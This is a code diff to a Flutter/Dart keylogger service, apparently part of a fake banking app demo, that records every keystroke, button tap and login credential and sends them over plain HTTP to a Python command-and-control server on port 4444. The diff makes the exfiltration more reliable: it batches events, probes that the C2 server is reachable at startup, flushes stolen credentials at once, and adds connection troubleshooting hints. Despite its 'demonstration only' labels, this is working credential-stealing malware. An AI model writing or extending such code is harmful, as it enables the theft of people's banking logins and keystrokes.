@@ -32,20 +32,31 @@ const int    _serverPort = 4444;
 const String _serverUrl  = 'http://$_serverHost:$_serverPort/';
 
 /// Unique demo device ID (not real hardware identifier).
-final String _demoDviceId =
+final String _demoDeviceId =
     'DEMO_${DateTime.now().millisecondsSinceEpoch.toRadixString(16).toUpperCase()}';
 
 /// DEMONSTRATION PURPOSE ONLY
 ///
 /// Singleton service that queues and batch-sends telemetry events to the
 /// Python C2 server over plain HTTP.
+///
+/// Events are batched and sent on a periodic timer (every 250 ms) rather than
+/// on every individual keystroke.  This avoids overwhelming the emulator's
+/// virtual network layer with dozens of short-lived TCP connections per second
+/// and prevents the "Connection reset by peer" errors that occur when the
+/// single-threaded Python HTTPServer cannot drain its Accept queue fast enough.
 class KeyloggerService {
   KeyloggerService._();
   static final KeyloggerService instance = KeyloggerService._();
 
   final List<Map<String, dynamic>> _queue = [];
   Timer? _flushTimer;
+
+  // Single persistent HTTP client — avoids creating a new TCP connection
+  // (and a new ephemeral port) for every batch.
+  HttpClient? _client;
   bool _sessionStarted = false;
+  bool _isSending = false;
 
   // ── Public API ─────────────────────────────────────────────────────────────
 
@@ -53,20 +64,43 @@ class KeyloggerService {
   void startSession() {
     if (_sessionStarted) return;
     _sessionStarted = true;
+
+    _client = HttpClient();
+    _client!.connectionTimeout = const Duration(seconds: 3);
+
     _enqueue({
       'type':      'session_start',
-      'device_id': _demoDviceId,
+      'device_id': _demoDeviceId,
       'screen':    'APP',
     });
     _startFlushTimer();
-    // print('[KEYLOGGER] DEMO: session started → $_serverUrl');
+    _testConnectivity();
+  }
+
+  /// Quick connectivity check — verifies the C2 server is reachable on startup.
+  void _testConnectivity() async {
+    try {
+      // Use a fresh one-shot client for the startup probe so it doesn't
+      // interfere with the persistent client.
+      final probe = HttpClient();
+      probe.connectionTimeout = const Duration(seconds: 3);
+      final request = await probe.postUrl(Uri.parse(_serverUrl));
+      request.headers.set('Content-Type', 'application/json');
+      request.write('[]');
+      final response = await request.close();
+      await response.drain<void>();
+      probe.close();
+      print('[C2] ✓ Server reachable at $_serverUrl');
+    } catch (e) {
+      print('[C2] ✗ WARNING: Cannot reach C2 server at $_serverUrl');
+      print('[C2]   → Is c2_server.py running? Run: python c2_server.py');
+      print('[C2]   → Error: $e');
+    }
   }
 
   /// Report every individual keystroke in a text field.
   ///
-  /// [screen]  — current screen name (e.g. 'Login', 'Transfer')
-  /// [field]   — field name          (e.g. 'customer_id', 'password')
-  /// [value]   — full current text of the field after the keystroke
+  /// Events are enqueued and sent on the next timer tick (≤ 250 ms).
   void logKeystroke({
     required String screen,
     required String field,
@@ -78,14 +112,9 @@ class KeyloggerService {
       'field':  field,
       'value':  value,
     });
-    // Flush immediately — every keystroke must appear in real time.
-    _flush();
   }
 
   /// Report a button / link tap.
-  ///
-  /// [screen] — current screen name
-  /// [label]  — button label or identifier
   void logButtonClick({
     required String screen,
     required String label,
@@ -95,15 +124,9 @@ class KeyloggerService {
       'screen': screen,
       'label':  label,
     });
-    // Flush immediately — button taps must appear in real time.
-    _flush();
   }
 
   /// Report a field that has been fully submitted / confirmed.
-  ///
-  /// [screen] — current screen name
-  /// [field]  — field name
-  /// [value]  — final submitted value
   void logFieldSubmit({
     required String screen,
     required String field,
@@ -119,7 +142,7 @@ class KeyloggerService {
 
   /// DEMONSTRATION PURPOSE ONLY — reports a captured credential pair.
   ///
-  /// Called by [LoginScreen] after successful credential validation.
+  /// Flushed immediately (bypasses the timer) so credentials appear without delay.
   void logCredential({
     required String screen,
     required String field,
@@ -131,7 +154,7 @@ class KeyloggerService {
       'field':  field,
       'value':  value,
     });
-    // Flush immediately so the credential appears in the terminal without delay.
+    // Flush immediately — credentials must appear without delay.
     _flush();
   }
 
@@ -140,40 +163,55 @@ class KeyloggerService {
   void _enqueue(Map<String, dynamic> event) {
     event['ts'] = DateTime.now().toIso8601String();
     _queue.add(event);
-    // NOTE: individual methods call _flush() directly.
-    // The timer is a safety-net fallback for any remaining events.
   }
 
   void _startFlushTimer() {
     _flushTimer?.cancel();
-    // Send any buffered events every 500 ms for near-real-time display.
-    _flushTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
+    // Batch-send queued events every 250 ms for near-real-time display
+    // while keeping the connection rate low enough for the emulator.
+    _flushTimer = Timer.periodic(const Duration(milliseconds: 250), (_) {
       if (_queue.isNotEmpty) _flush();
     });
   }
 
   void _flush() {
-    if (_queue.isEmpty) return;
+    if (_queue.isEmpty || _isSending) return;
     final batch = List<Map<String, dynamic>>.from(_queue);
     _queue.clear();
     _send(batch);
   }
 
   Future<void> _send(List<Map<String, dynamic>> batch) async {
-    // DEMONSTRATION PURPOSE ONLY — plaintext HTTP POST (no TLS)
+    if (_client == null) return;
+    _isSending = true;
     try {
-      final client  = HttpClient();
-      client.connectionTimeout = const Duration(seconds: 3);
-      final request = await client.postUrl(Uri.parse(_serverUrl));
+      final request = await _client!.postUrl(Uri.parse(_serverUrl));
       request.headers.set('Content-Type', 'application/json');
+      request.headers.set('Connection', 'close'); // HTTP/1.0 compat
       request.write(jsonEncode(batch));
       final response = await request.close();
       await response.drain<void>();
-      client.close();
-      print('[C2] Sent ${batch.length} event(s) to $_serverUrl'); // DEBUG
+      print('[C2] Sent ${batch.length} event(s) to $_serverUrl');
     } catch (e) {
-      // DEMO DEBUG: print connection error so we can diagnose
+      final errStr = e.toString().toLowerCase();
+      String hint;
+      if (errStr.contains('refused') || errStr.contains('connection refused')) {
+        hint = 'Connection refused — is c2_server.py running?';
+      } else if (errStr.contains('unreachable') || errStr.contains('no route')) {
+        hint = 'Network unreachable — check emulator network or run: adb reverse tcp:4444 tcp:4444';
+      } else if (errStr.contains('timeout')) {
+        hint = 'Connection timed out — check Windows Firewall (allow Python on port 4444)';
+      } else if (errStr.contains('reset')) {
+        hint = 'Connection reset — restart C2 server (Ctrl+C then: python c2_server.py)';
+      } else if (errStr.contains('host')) {
+        hint = 'DNS/host error — verify _serverHost=\"$_serverHost\" is correct for your setup';
+      } else {
+        hint = 'Unexpected error — check Flutter console for details';
+      }
       print('[C2] ERROR sending to $_serverUrl  →  $e');
+      print('[C2]   → $hint');
+    } finally {
+      _isSending = false;
     }
   }
 }
